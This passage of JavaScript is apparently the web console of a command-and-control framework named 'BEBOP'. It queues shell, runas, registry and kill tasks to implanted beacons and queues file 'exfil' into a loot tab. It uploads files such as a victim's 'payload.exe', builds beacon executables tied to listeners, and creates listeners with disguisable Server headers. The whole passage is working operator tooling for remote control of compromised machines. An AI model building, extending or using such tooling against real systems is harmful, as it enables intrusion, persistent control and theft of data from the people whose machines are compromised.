    const a    = document.createElement('a');
    a.href     = url;
    a.download = 'bebop-eventlog-' + dateStr + '.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

const ANSI = {
    reset: '\x1b[0m',
    amber: '\x1b[33m',
    cream: '\x1b[97m',
    red:   '\x1b[91m',
    dim:   '\x1b[2m',
};

const PROMPT_STR = ANSI.amber + '[BEBOP ~]$ ' + ANSI.reset;

function getBeaconId() {
    const parts = window.location.pathname.split('/');
    return parseInt(parts[parts.length - 1], 10);
}

async function loadBeaconInfo(id) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp    = await fetch(tsUrl + '/api/sessions');
        const beacons = await resp.json();
        const b = beacons.find(x => x.id === id);
        if (!b) return;
        if (_lastSeenPrev === 0) _lastSeenPrev = b.last_seen;
        const text = [
            (b.hostname || '?'),
            (b.username || '?'),
            'PID ' + b.process_id,
            'Sleep ' + b.sleep + 's',
            INTEGRITY_MAP[b.integrity] ?? ''
        ].join(' // ');
        const el = document.getElementById('beacon-info')
                || document.getElementById('panel-beacon-info');
        if (el) el.textContent = text;
    } catch (_) {}
}

// ---- Xterm helpers ----

function _writePrompt() {
    _promptVisible = true;
    _term.write(PROMPT_STR);
}

function _redrawTail() {
    const tail = _inputBuf.slice(_cursorPos);
    _term.write('\x1b[K' + tail);
    if (tail.length > 0) _term.write('\x1b[' + tail.length + 'D');
}

function _replaceBuffer(val) {
    if (_cursorPos > 0) _term.write('\x1b[' + _cursorPos + 'D');
    _term.write('\x1b[K' + val);
    _inputBuf  = val;
    _cursorPos = val.length;
}

function appendLine(text, cls) {
    if (!_term) return;
    const normalized = String(text).replace(/\r\n/g, '\n').replace(/\r/g, '\n').trimEnd();
    if (!normalized.trim()) return;
    _serverSaveDirty = true;

    _outputLog.push({ text, cls });

    let color;
    switch (cls) {
        case 'cmd-echo': color = ANSI.cream;            break;
        case 'err':      color = ANSI.red;              break;
        case 'hint':     color = ANSI.dim + ANSI.amber; break;
        default:         color = ANSI.cream;            break;
    }

    const lines = normalized.split('\n');

    if (_promptVisible) {
        if (_cursorPos > 0) _term.write('\x1b[' + _cursorPos + 'D');
        _term.write('\r\x1b[K');
        for (const line of lines) _term.write(color + line + ANSI.reset + '\r\n');
        _term.write(PROMPT_STR + _inputBuf);
        if (_cursorPos < _inputBuf.length) {
            _term.write('\x1b[' + (_inputBuf.length - _cursorPos) + 'D');
        }
    } else {
        for (const line of lines) _term.writeln(color + line + ANSI.reset);
    }

    if (cls !== 'cmd-echo' && text.trim()) {
        const orig = document.title.replace(/^\[★\] /, '');
        document.title = '[★] ' + orig;
        setTimeout(() => { document.title = orig; }, 4000);
    }
}

// ---- Tab completion ----

function _handleTab() {
    if (!_inputBuf) return;
    const word    = _inputBuf.split(/\s+/)[0].toLowerCase();
    const matches = VALID_COMMANDS.filter(c => c.startsWith(word));
    if (matches.length === 1) {
        const rest = _inputBuf.indexOf(' ') >= 0 ? _inputBuf.slice(_inputBuf.indexOf(' ')) : ' ';
        _replaceBuffer(matches[0] + rest);
    } else if (matches.length > 1) {
        _term.write('\r\n' + ANSI.dim + ANSI.amber + matches.join('   ') + ANSI.reset + '\r\n');
        _writePrompt();
        _term.write(_inputBuf);
        if (_cursorPos < _inputBuf.length) _term.write('\x1b[' + (_inputBuf.length - _cursorPos) + 'D');
    }
}

// ---- Line input handler ----

function _handleData(data) {
    switch (data) {
        case '\x1b[A': // Arrow Up
            if (!cmdHistory.length) return;
            historyIdx = Math.min(historyIdx + 1, cmdHistory.length - 1);
            _replaceBuffer(cmdHistory[historyIdx] || '');
            return;
        case '\x1b[B': // Arrow Down
            historyIdx = Math.max(historyIdx - 1, -1);
            _replaceBuffer(historyIdx >= 0 ? cmdHistory[historyIdx] : '');
            return;
        case '\x1b[C': // Right
            if (_cursorPos < _inputBuf.length) { _cursorPos++; _term.write('\x1b[C'); }
            return;
        case '\x1b[D': // Left
            if (_cursorPos > 0) { _cursorPos--; _term.write('\x1b[D'); }
            return;
        case '\x01': case '\x1b[H': // Ctrl+A / Home
            if (_cursorPos > 0) { _term.write('\x1b[' + _cursorPos + 'D'); _cursorPos = 0; }
            return;
        case '\x05': case '\x1b[F': // Ctrl+E / End
            if (_cursorPos < _inputBuf.length) {
                _term.write('\x1b[' + (_inputBuf.length - _cursorPos) + 'C');
                _cursorPos = _inputBuf.length;
            }
            return;
        case '\x7f': case '\b': // Backspace
            if (_cursorPos > 0) {
                _inputBuf  = _inputBuf.slice(0, _cursorPos - 1) + _inputBuf.slice(_cursorPos);
                _cursorPos--;
                _term.write('\b');
                _redrawTail();
            }
            return;
        case '\x1b[3~': // Delete
            if (_cursorPos < _inputBuf.length) {
                _inputBuf = _inputBuf.slice(0, _cursorPos) + _inputBuf.slice(_cursorPos + 1);
                _redrawTail();
            }
            return;
        case '\x15': // Ctrl+U — kill to start
            if (_cursorPos > 0) { _term.write('\x1b[' + _cursorPos + 'D'); _cursorPos = 0; }
            _inputBuf  = _inputBuf.slice(_cursorPos);
            _cursorPos = 0;
            _redrawTail();
            return;
        case '\x0b': // Ctrl+K — kill to end
            _inputBuf = _inputBuf.slice(0, _cursorPos);
            _term.write('\x1b[K');
            return;
        case '\x03': // Ctrl+C
            _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
            _term.write('^C\r\n');
            _writePrompt();
            return;
        case '\x0c': // Ctrl+L — clear screen + home, then fresh prompt
            _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
            _term.write('\x1b[2J\x1b[H');
            _writePrompt();
            return;
        case '\t':
            _handleTab();
            return;
        case '\r': case '\n': {
            const cmd  = _inputBuf.trim();
            _inputBuf  = ''; _cursorPos = 0; _promptVisible = false;
            _term.write('\r\n');
            if (cmd) _processCommand(cmd);
            else     _writePrompt();
            return;
        }
    }
    // Filter to printable characters (handles both single keypress and multi-char paste)
    const printable = data.replace(/[^\x20-\x7e]/g, '');
    if (printable.length > 0) {
        _inputBuf = _inputBuf.slice(0, _cursorPos) + printable + _inputBuf.slice(_cursorPos);
        _cursorPos += printable.length;
        _term.write(printable);
        if (_cursorPos < _inputBuf.length) {
            const tail = _inputBuf.slice(_cursorPos);
            _term.write(tail + '\x1b[' + tail.length + 'D');
        }
    }
}

// ---- Command dispatch ----

async function _processCommand(cmd) {
    const baseCmd = cmd.split(/\s+/)[0].toLowerCase();
    cmdHistory.unshift(cmd);
    if (cmdHistory.length > 100) cmdHistory.pop();
    historyIdx = -1;

    _outputLog.push({ text: PROMPT_STR + cmd, cls: 'cmd-echo' });
    _beaconStates[beaconId] = {
        outputLog: _outputLog.slice(),
        cmdHistory: cmdHistory.slice(),
        pollSince: pollSince,
    };
    _saveTerminalToServer(beaconId);
    _serverSaveDirty = false;

    if (cmd === 'help') {
        HELP_TEXT.forEach(line => appendLine(line, 'output'));
        _writePrompt();
        return;
    }

    if (cmd === 'clear') {
        _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
        _term.write('\x1b[2J\x1b[H');
        _writePrompt();
        return;
    }

    if (!VALID_COMMANDS.includes(baseCmd)) {
        appendLine(`[error] unknown command: "${baseCmd}". type "help" for a list of valid commands.`, 'err');
        _writePrompt();
        return;
    }

    const cmdArgs = cmd.slice(baseCmd.length).trim();
    const NEEDS_ARGS = {
        cd:        '<path>',
        cat:       '<file>',
        stat:      '<path>',
        mkdir:     '<path>',
        rm:        '<file>',
        rmdir:     '<path>',
        cp:        '<src> <dst>',
        mv:        '<src> <dst>',
        kill:      '<pid>',
        dns:       '<hostname>',
        reg_query: '<HIVE\\key> <value>',
        reg_set:   '<HIVE\\key> <value> <data>',
        runas:     '<user> <pass> <cmd>',
        shell:     '<cmd>',
        sleep:     '<seconds> [jitter%]',
        getenv:    '<name>',
    };
    if (NEEDS_ARGS[baseCmd] && !cmdArgs) {
        appendLine('[error] usage: ' + baseCmd + ' ' + NEEDS_ARGS[baseCmd], 'err');
        _writePrompt();
        return;
    }
    if (baseCmd === 'kill') {
        const pid = parseInt(cmdArgs, 10);
        if (isNaN(pid) || pid <= 0) {
            appendLine('[error] kill requires a valid PID (number > 0)', 'err');
            _writePrompt(); return;
        }
    }
    if ((baseCmd === 'cp' || baseCmd === 'mv') && cmdArgs.split(/\s+/).length < 2) {
        appendLine('[error] usage: ' + baseCmd + ' <src> <dst>', 'err');
        _writePrompt(); return;
    }
    if (baseCmd === 'runas' && cmdArgs.split(/\s+/).length < 3) {
        appendLine('[error] usage: runas <user> <pass> <cmd>', 'err');
        _writePrompt(); return;
    }

    const tsUrl = getTsUrl();
    if (!tsUrl) { appendLine('[error] teamserver not configured', 'err'); _writePrompt(); return; }
    if (beaconId === null || isNaN(beaconId)) {
        appendLine('[error] no beacon selected', 'err'); _writePrompt(); return;
    }

    // ---- File transfer builtins ----

    if (baseCmd === 'download') {
        const remotePath = cmd.slice(9).trim();
        if (!remotePath) { appendLine('[error] usage: download <remote_path>', 'err'); _writePrompt(); return; }
        try {
            const resp = await fetch(tsUrl + '/api/task', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify({ beacon_id: beaconId, type: 4, code: 0, args: remotePath }),
            });
            if (!resp.ok) appendLine('[error] server returned ' + resp.status, 'err');
            else        { appendLine('[+] exfil queued: ' + remotePath, 'hint'); _pendingTasks++; }
        } catch (e) { appendLine('[error] ' + e.message, 'err'); }
        _writePrompt();
        return;
    }

    if (baseCmd === 'upload') {
        const destPath = cmd.slice(7).trim();
        if (!destPath) { appendLine('[error] usage: upload <remote_path>', 'err'); appendLine('  e.g. upload C:\\Users\\victim\\Desktop\\payload.exe', 'hint'); _writePrompt(); return; }
        let picker = document.getElementById('upload-picker');
        if (!picker) {
            picker = document.createElement('input');
            picker.type  = 'file';
            picker.id    = 'upload-picker';
            picker.style.display = 'none';
            document.body.appendChild(picker);
        }
        picker.onchange = async () => {
            const file = picker.files[0];
            if (!file) return;
            const fd = new FormData();
            fd.append('beacon_id', String(beaconId));
            fd.append('dest_path', destPath);
            fd.append('file', file);
            try {
                const r = await fetch(tsUrl + '/api/upload', { method: 'POST', body: fd });
                if (!r.ok) { appendLine('[error] upload failed: ' + r.status, 'err'); return; }
                const j = await r.json();
                appendLine('[+] upload queued: ' + j.chunks + ' chunk(s) -> ' + destPath, 'hint');
                _pendingTasks++;
            } catch (e) { appendLine('[error] ' + e.message, 'err'); }
            picker.value = '';
        };
        picker.click();
        _writePrompt();
        return;
    }

    // ---- Generic task dispatch ----

    let taskType = 12; // TaskRun
    let taskCode = 0;  // CodeRunShell
    let taskArgs = cmd;

    if (baseCmd === 'sleep') {
        const sleepParts = cmd.substring(5).trim().split(/\s+/);
        const sec = parseInt(sleepParts[0], 10);
        const jit = sleepParts.length > 1 ? parseInt(sleepParts[1], 10) : 0;
        if (isNaN(sec) || sec < 0 || (sleepParts.length > 1 && (isNaN(jit) || jit < 0 || jit > 100))) {
            appendLine('[error] usage: sleep <seconds> [jitter%]', 'err');
            appendLine('  e.g. sleep 5 20', 'hint');
            _writePrompt(); return;
        }
        taskType = 2; // TaskSet
        taskCode = 0; // CodeSetSleep
        taskArgs = sec + (sleepParts.length > 1 ? ' ' + jit : '');
    } else if (baseCmd === 'exit') {
        taskType = 1; // TaskExit
        taskCode = 0; // CodeExitNormal
        taskArgs = '';
    }

    try {
        const resp = await fetch(tsUrl + '/api/task', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({
                beacon_id: beaconId,
                type: taskType,
                code: taskCode,
                args: taskArgs
            }),
        });
        if (!resp.ok) {
            appendLine('[error] server returned ' + resp.status + (resp.status === 404 ? ' (Beacon may not exist anymore)' : ''), 'err');
        } else {
            appendLine('[+] task queued', 'hint');
            _pendingTasks++;
        }
    } catch (e) {
        appendLine('[error] ' + e.message, 'err');
    }
    _writePrompt();
}

// ---- Xterm init ----

function _initXterm(containerId) {
    const el = document.getElementById(containerId);
    if (!el || _term || typeof Terminal === 'undefined') return;

    const term = new Terminal({
        fontFamily:        "'Share Tech Mono', 'Courier New', monospace",
        fontSize:          14,
        letterSpacing:     0.5,
        lineHeight:        1.4,
        cursorBlink:       true,
        cursorStyle:       'block',
        scrollback:        5000,
        scrollSensitivity: 3,
        allowTransparency: true,
        theme: {
            background:          '#000000',
            foreground:          '#d4d4d4',
            cursor:              '#ffb000',
            cursorAccent:        '#000000',
            selectionBackground: 'rgba(255,176,0,0.25)',
            black:   '#000000', red:     '#c84b31',
            green:   '#4a90a4', yellow:  '#ffb000',
            blue:    '#4a90a4', magenta: '#c84b31',
            cyan:    '#4a90a4', white:   '#e8d5a3',
            brightBlack:   '#1e2d3d', brightRed:     '#c84b31',
            brightGreen:   '#4a90a4', brightYellow:  '#ffb000',
            brightBlue:    '#4a90a4', brightMagenta: '#c84b31',
            brightCyan:    '#4a90a4', brightWhite:   '#ffffff',
        },
    });

    const fit = new FitAddon.FitAddon();
    term.loadAddon(fit);
    term.open(el);
    try { fit.fit(); } catch (_) {}

    _term     = term;
    _fitAddon = fit;

    new ResizeObserver(() => { try { fit.fit(); } catch (_) {} }).observe(el);
    term.onData(_handleData);
}

function openFullscreenTerminal() {
    if (beaconId === null || isNaN(beaconId)) return;
    window.location.href = '/interact/' + beaconId;
}

function termFontSize(delta) {
    if (!_term) return;
    const cur = _term.options.fontSize || 14;
    const next = Math.max(8, Math.min(28, cur + delta));
    _term.options.fontSize = next;
    if (_fitAddon) try { _fitAddon.fit(); } catch (_) {}
}

// ---- Poll results ----

async function pollResults() {
    const tsUrl = getTsUrl();
    if (!tsUrl || beaconId === null || isNaN(beaconId)) return;
    try {
        const sr = await fetch(tsUrl + '/api/sessions');
        if (sr.ok) {
            const bs = await sr.json();
            const b = bs.find(x => x.id === beaconId);
            if (b) {
                if (_lastSeenPrev > 0 && b.last_seen > _lastSeenPrev && _pendingTasks > 0) {
                    appendLine('[+] task delivered to beacon', 'hint');
                    _pendingTasks = 0;
                }
                _lastSeenPrev = b.last_seen;
            }
        }
    } catch (_) {}
    try {
        const resp = await fetch(tsUrl + `/api/results/${beaconId}?since=${pollSince}`);
        if (!resp.ok) return;
        const results = await resp.json();
        let hasNew = false;
        for (const r of (results || [])) {
            if (r.type === 3) {
                appendLine('[+] ' + (r.output || 'upload complete'), 'output');
            } else if (r.type === 4) {
                appendLine('[+] exfil complete: ' + (r.filename || '?'), 'output');
                appendLine('    check the LOOT tab to download or delete', 'hint');
                loadLootPanel();
            } else if (r.type === 2) {
                appendLine('[+] ' + (r.output || 'config updated'), 'hint');
                loadSessions();
            } else {
                appendLine(r.output || '', 'output');
            }
            if (r.received_at > pollSince) pollSince = r.received_at;
            hasNew = true;
        }
        if (hasNew && _term) _term.scrollToBottom();
    } catch (_) {}
}

// ---- Tabbed terminal management ----

const _openTabs = new Map();

function _renderTabs() {
    const bar = document.getElementById('terminal-tabs');
    if (!bar) return;
    bar.innerHTML = '';
    for (const [id, tab] of _openTabs) {
        const el = document.createElement('div');
        el.className = 'terminal-tab' + (id === beaconId ? ' active' : '');
        el.innerHTML =
            '<span class="terminal-tab-name">#' + id + ' ' + escapeHtml(tab.hostname || '?') + '</span>' +
            '<span class="terminal-tab-close" data-id="' + id + '">&times;</span>';
        el.addEventListener('click', (e) => {
            if (e.target.classList.contains('terminal-tab-close')) return;
            _switchTab(id);
        });
        el.querySelector('.terminal-tab-close').addEventListener('click', (e) => {
            e.stopPropagation();
            _closeTab(id);
        });
        bar.appendChild(el);
    }
}

async function _switchTab(id) {
    if (id === beaconId) return;
    _saveBeaconState(beaconId);

    beaconId = id;

    if (_term) {
        _term.clear();
        _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
        _outputLog = [];
    }

    if (!_restoreBeaconState(id)) {
        const serverState = await _loadTerminalFromServer(id);
        if (serverState && serverState.outputLog.length > 0) {
            _beaconStates[id] = serverState;
            _restoreBeaconState(id);
            pollSince = serverState.pollSince || 0;
        }
    }
    _writePrompt();
    if (_term) { _term.scrollToBottom(); _term.focus(); }

    if (pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(pollResults, 2000);
    pollResults();

    _renderTabs();
    _saveTabs();
}

function _closeTab(id) {
    _openTabs.delete(id);
    delete _beaconStates[id];

    if (id === beaconId) {
        if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
        beaconId = null;

        if (_openTabs.size > 0) {
            const nextId = _openTabs.keys().next().value;
            _switchTab(nextId);
        } else {
            document.body.classList.remove('panel-open');
            if (_term) {
                _term.clear();
                _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
                _outputLog = [];
            }
            _renderTabs();
        }
    } else {
        _renderTabs();
    }
    _saveTabs();
}

async function openTerminal(id) {
    if (!_term) _initXterm('terminal');

    if (_openTabs.has(id)) {
        _switchTab(id);
        document.body.classList.add('panel-open');
        _saveTabs();
        return;
    }

    _saveBeaconState(beaconId);

    beaconId = id;

    if (_term) {
        _term.clear();
        _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
        _outputLog = [];
    }

    document.body.classList.add('panel-open');

    const serverState = await _loadTerminalFromServer(id);
    if (serverState && serverState.outputLog.length > 0) {
        _beaconStates[id] = serverState;
        _restoreBeaconState(id);
        pollSince = serverState.pollSince || 0;
    } else {
        pollSince = Math.floor(Date.now() / 1000) - 1;
        appendLine('Type "help" to list available commands.', 'hint');
    }
    _writePrompt();
    if (_term) { _term.scrollToBottom(); _term.focus(); }

    _openTabs.set(id, { hostname: '?' });
    _fetchTabHostname(id);
    _renderTabs();
    _saveTabs();

    if (pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(pollResults, 2000);
    pollResults();
}

async function _fetchTabHostname(id) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await fetch(tsUrl + '/api/sessions');
        const beacons = await resp.json();
        const b = beacons.find(x => x.id === id);
        if (!b) return;
        const tab = _openTabs.get(id);
        if (tab) {
            tab.hostname = b.hostname || '?';
            _renderTabs();
        }
    } catch (_) {}
}

function closeTerminal() {
    _saveBeaconState(beaconId);
    document.body.classList.remove('panel-open');
    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
    beaconId = null;
    _saveTabs();
}

window.addEventListener('beforeunload', () => {
    if (beaconId != null && _term) {
        _beaconStates[beaconId] = {
            outputLog: _outputLog.slice(),
            cmdHistory: cmdHistory.slice(),
            pollSince: pollSince,
        };
        const tsUrl = getTsUrl();
        if (tsUrl) {
            const state = _beaconStates[beaconId];
            const blob = new Blob([JSON.stringify({
                output_log: state.outputLog,
                cmd_history: state.cmdHistory,
                poll_since: state.pollSince,
            })], { type: 'text/plain' });
            navigator.sendBeacon(tsUrl + '/api/terminal/' + beaconId, blob);
        }
    }
    if (document.getElementById('sessions-grid') !== null) _saveTabs();
});

// ---- Build page ----

function showBuildStatus(msg, cls) {
    const el = document.getElementById('build-status');
    if (!el) return;
    el.textContent = msg;
    el.className = 'build-status ' + (cls || '');
}

async function populateBuildListeners() {
    const tsUrl = getTsUrl();
    const sel = document.getElementById('buildListener');
    if (!sel) return;
    if (!tsUrl) { sel.innerHTML = '<option value="">— connect to teamserver first —</option>'; return; }

    try {
        const resp = await fetch(tsUrl + '/api/listeners');
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
        const listeners = await resp.json();
        sel.innerHTML = '<option value="">— select a listener —</option>';
        for (const l of (listeners || [])) {
            const opt = document.createElement('option');
            opt.value = l.id;
            const certNote = l.scheme === 'https' ? (l.auto_cert ? ' [self-signed]' : ' [custom cert]') : '';
            opt.textContent = l.name + ' — ' + l.scheme + '://' + (l.host || '?') + ':' + l.port + certNote;
            if (!l.host) opt.disabled = true;
            sel.appendChild(opt);
        }
    } catch (e) {
        sel.innerHTML = '<option value="">— could not load listeners —</option>';
    }
}

function onListenerSelect(sel) {
    const hint = document.getElementById('listener-preview');
    if (!hint) return;
    const opt = sel.options[sel.selectedIndex];
    hint.textContent = opt && opt.value ? opt.textContent : '';
}

async function buildBeacon() {
    const tsUrl = getTsUrl();
    if (!tsUrl) {
        showBuildStatus('Enter teamserver address and click Connect first.', 'err');
        return;
    }

    const sel        = document.getElementById('buildListener');
    const listenerId = sel ? parseInt(sel.value, 10) : NaN;
    const sleepDays  = parseInt(document.getElementById('buildSleepDays').value,  10) || 0;
    const sleepHours = parseInt(document.getElementById('buildSleepHours').value, 10) || 0;
    const sleepMins  = parseInt(document.getElementById('buildSleepMins').value,  10) || 0;
    const sleepSecs  = parseInt(document.getElementById('buildSleepSecs').value,  10) || 0;
    const sleepMs    = Math.max(1000, (sleepDays * 86400 + sleepHours * 3600 + sleepMins * 60 + sleepSecs) * 1000);
    const jitter     = parseInt(document.getElementById('buildJitter').value, 10);
    const format     = document.getElementById('buildFormat')?.value || 'exe';

    if (!listenerId || isNaN(listenerId)) {
        showBuildStatus('Select a listener first.', 'err');
        return;
    }

    const btn      = document.getElementById('build-btn');
    const filename = format === 'bin' ? 'beacon.bin' : 'beacon.exe';
    btn.disabled = true;
    showBuildStatus('3, 2, 1, let\'s jam\u2026 compiling ' + filename, '');

    try {
        const resp = await fetch(tsUrl + '/api/build', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({
                listener_id: listenerId,
                sleep_ms:    sleepMs,
                jitter_pct:  isNaN(jitter) ? 20 : jitter,
                format:      format,
            })
        });
        if (!resp.ok) {
            const text = await resp.text();
            showBuildStatus('Build failed: ' + text, 'err');
            return;
        }
        const blob = await resp.blob();
        const url  = URL.createObjectURL(blob);
        const a    = document.createElement('a');
        a.href     = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        showBuildStatus(filename + ' ready \u2014 download started.', 'ok');
    } catch (e) {
        showBuildStatus('Error: ' + e.message, 'err');
    } finally {
        btn.disabled = false;
    }
}

// ---- Listeners page ----

async function loadListeners() {
    const tsUrl = getTsUrl();
    const tbody = document.getElementById('listeners-tbody');
    const noMsg = document.getElementById('no-listeners');
    const count = document.getElementById('listener-count');
    if (!tbody) return;

    if (!tsUrl) {
        tbody.innerHTML = '';
        if (noMsg) { noMsg.style.display = ''; }
        updateConnIndicator(false);
        return;
    }

    try {
        const resp = await fetch(tsUrl + '/api/listeners');
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
        const listeners = await resp.json();

        updateConnIndicator(true);
        if (count) count.textContent = listeners.length ? '// ' + listeners.length + ' active' : '';

        if (!listeners || listeners.length === 0) {
            tbody.innerHTML = '';
            if (noMsg) noMsg.style.display = '';
            return;
        }
        if (noMsg) noMsg.style.display = 'none';

        tbody.innerHTML = '';
        listeners.forEach((l, i) => {
            const tr = document.createElement('tr');
            tr.style.animationDelay = (i * 0.04) + 's';

            const schemeBadge = '<span class="listener-badge badge-' + l.scheme + '">' + l.scheme.toUpperCase() + '</span>';
            const certBadge   = l.scheme === 'https'
                ? (l.auto_cert
                    ? '<span class="listener-badge badge-autocert">self-signed</span>'
                    : '<span class="listener-badge badge-realcert">custom</span>')
                : '<span style="color:var(--text-dim);font-family:\'Share Tech Mono\',monospace;font-size:11px;">—</span>';
            const deleteBtn = '<button class="btn-delete-listener"' +
                ' onclick="confirmDeleteListener(' + l.id + ',\'' + escapeHtml(l.name) + '\')"' +
                '>delete</button>';

            tr.innerHTML =
                '<td style="color:var(--text-dim);">' + l.id + '</td>' +
                '<td>' + escapeHtml(l.name) + '</td>' +
                '<td>' + schemeBadge + '</td>' +
                '<td style="font-family:\'Share Tech Mono\',monospace;">' + escapeHtml(l.host || '—') + '</td>' +
                '<td>' + l.port + '</td>' +
                '<td>' + certBadge + '</td>' +
                '<td>' + deleteBtn + '</td>';
            tbody.appendChild(tr);
        });
    } catch (e) {
        if (noMsg) {
            noMsg.innerHTML = 'Cannot reach teamserver — ' + escapeHtml(e.message) +
                '<span style="display:block;font-style:italic;font-size:11px;margin-top:8px;opacity:0.6;">"The music\'s over. Try again."</span>';
            noMsg.style.display = '';
        }
        tbody.innerHTML = '';
        updateConnIndicator(false);
    }
}

let _deleteListenerId = null;

function confirmDeleteListener(id, name) {
    _deleteListenerId = id;
    const el = document.getElementById('delete-listener-target');
    if (el) el.textContent = name || ('listener #' + id);
    const modal = document.getElementById('delete-listener-modal');
    if (modal) modal.style.display = 'flex';
}

function cancelDeleteListener() {
    _deleteListenerId = null;
    const modal = document.getElementById('delete-listener-modal');
    if (modal) modal.style.display = 'none';
}

function execDeleteListener() {
    const id = _deleteListenerId;
    cancelDeleteListener();
    if (id == null) return;
    deleteListenerById(id);
}

async function deleteListenerById(id) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await fetch(tsUrl + '/api/listeners/' + id, { method: 'DELETE' });
        if (!resp.ok) throw new Error(await resp.text());
        loadListeners();
    } catch (e) {
        alert('Delete failed: ' + e.message);
    }
}

function showCreateModal() {
    const tsUrl = getTsUrl();
    if (!tsUrl) { alert('Connect to teamserver first.'); return; }
    
    // Clear fields safely
    const fields = ['ln-name', 'ln-host', 'ln-port', 'ln-cert', 'ln-key'];
    fields.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.value = '';
    });

    const radios = document.querySelectorAll('input[name="ln-scheme"]');
    radios.forEach(r => { r.checked = r.value === 'http'; });

    const httpsFields = document.getElementById('https-fields');
    if (httpsFields) httpsFields.style.display = 'none';

    const headerList = document.getElementById('custom-headers-list');
    if (headerList) headerList.innerHTML = '';

    const statusEl = document.getElementById('create-status');
    if (statusEl) statusEl.textContent = '';

    const modal = document.getElementById('create-modal');
    if (modal) modal.style.display = 'flex';
}

function hideCreateModal() {
    const modal = document.getElementById('create-modal');
    if (modal) modal.style.display = 'none';
}

function onSchemeChange(el) {
    const isHttps = el.value === 'https';
    const httpsFields = document.getElementById('https-fields');
    if (httpsFields) httpsFields.style.display = isHttps ? '' : 'none';
    
    if (!isHttps) {
        const cert = document.getElementById('ln-cert');
        const key = document.getElementById('ln-key');
        if (cert) cert.value = '';
        if (key) key.value = '';
    }
}

function addHeaderRow() {
    const list = document.getElementById('custom-headers-list');
    if (!list) return;
    const pair = document.createElement('div');
    pair.className = 'header-pair';
    pair.innerHTML =
        '<input type="text" class="form-input-inline" placeholder="Header Name (e.g. Server)" title="Header name">' +
        '<input type="text" class="form-input-inline" placeholder="Value (e.g. nginx)" title="Header value">' +
        '<button type="button" class="btn-action-small" onclick="this.parentElement.remove()" style="border-color:var(--border-orange); color:var(--orange); min-width:32px;">&#x2715;</button>';
    list.appendChild(pair);
}

async function submitCreateListener() {
    const nameEl = document.getElementById('ln-name');
    const hostEl = document.getElementById('ln-host');
    const portEl = document.getElementById('ln-port');
    const certEl = document.getElementById('ln-cert');
    const keyEl  = document.getElementById('ln-key');
    const statusEl = document.getElementById('create-status');
    const schemeEl = document.querySelector('input[name="ln-scheme"]:checked');

    if (!nameEl || !hostEl || !portEl || !statusEl || !schemeEl) return;

    const name    = nameEl.value.trim();
    const scheme  = schemeEl.value;
    const host    = hostEl.value.trim();
    const port    = parseInt(portEl.value, 10);
    const certPem = certEl ? certEl.value.trim() : '';
    const keyPem  = keyEl ? keyEl.value.trim() : '';

    if (!name) { statusEl.textContent = 'name is required'; return; }
    if (!host) { statusEl.textContent = 'host is required'; return; }
    if (!port || port < 1 || port > 65535) { statusEl.textContent = 'valid port required (1-65535)'; return; }

    const customHeaders = {};
    document.querySelectorAll('#custom-headers-list .header-pair').forEach(pair => {
        const inputs = pair.querySelectorAll('input');
        if (inputs.length >= 2) {
            const k = inputs[0].value.trim();
            const v = inputs[1].value.trim();
            if (k) customHeaders[k] = v;
        }
    });

    const payload = {
        name,
        scheme,
        host,
        bind_addr: '0.0.0.0', // Fixed value
        port,
        cert_pem:  certPem,
        key_pem:   keyPem,
        custom_headers: Object.keys(customHeaders).length ? customHeaders : null,
    };

    const tsUrl = getTsUrl();
    try {
        const resp = await fetch(tsUrl + '/api/listeners', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(payload),
        });
        if (!resp.ok) {
            statusEl.textContent = 'Error: ' + (await resp.text());
            return;
        }
        hideCreateModal();
        loadListeners();
    } catch (e) {
        statusEl.textContent = 'Error: ' + e.message;
    }
}

// ---- Visibility change — pause/resume polling ----

document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        if (_sessionsInterval) { clearInterval(_sessionsInterval); _sessionsInterval = null; }
        if (pollInterval)      { clearInterval(pollInterval);      pollInterval = null; }
        if (_eventLogInterval) { clearInterval(_eventLogInterval); _eventLogInterval = null; }
        if (_lootInterval)     { clearInterval(_lootInterval);     _lootInterval = null; }
        if (_listenersInterval){ clearInterval(_listenersInterval); _listenersInterval = null; }
    } else {
        if (document.getElementById('sessions-grid') !== null) {
            if (!_sessionsInterval) { loadSessions(); _sessionsInterval = setInterval(loadSessions, 2000); }
            if (!_eventLogInterval) { loadEventLog(); _eventLogInterval = setInterval(loadEventLog, 5000); }
            if (!_lootInterval)     { loadLootPanel(); _lootInterval = setInterval(loadLootPanel, 8000); }
        }
        if (document.getElementById('listeners-tbody') !== null && !_listenersInterval) {
            loadListeners();
            _listenersInterval = setInterval(loadListeners, 8000);
        }
        if (beaconId !== null && !pollInterval) {
            pollInterval = setInterval(pollResults, 2000);
        }
    }
});

// ---- Init ----

if (document.getElementById('sessions-grid') !== null) {
    initSettings();
    loadEventLog();
    _eventLogInterval = setInterval(loadEventLog, 5000);
    loadLootPanel();
    _lootInterval = setInterval(loadLootPanel, 8000);
    loadSessions();
    _sessionsInterval = setInterval(loadSessions, 2000);

    ['tsIp', 'tsPort'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.addEventListener('keydown', e => { if (e.key === 'Enter') saveSettings(); });
    });

